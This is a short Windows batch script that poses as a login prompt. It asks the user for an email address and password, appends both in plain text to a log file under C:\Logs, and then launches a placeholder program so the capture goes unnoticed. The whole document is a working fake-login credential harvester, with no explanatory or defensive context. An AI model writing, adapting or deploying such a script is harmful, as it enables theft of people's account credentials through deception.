@echo off
color a
title Login
cls
echo Please Enter Email Adress And Password
echo.
echo.
cd "C:\Logs"
set /p user=Username:
set /p pass=Password:
echo Username="%user%" Password="%pass%" >> Log.txt
start >>Program Here<<
exit